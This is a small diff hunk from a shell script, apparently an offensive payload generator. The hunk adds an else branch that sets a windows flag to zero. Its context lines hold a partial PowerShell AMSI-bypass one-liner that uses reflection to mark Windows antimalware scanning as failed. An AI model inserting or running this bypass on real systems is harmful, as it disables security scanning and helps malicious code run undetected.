@@ -698,7 +698,8 @@ then
     at="@"
     #"Mini-AMSI-bypass. Partial"
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
-    
+else 
+    windows=0 
   
 fi
 
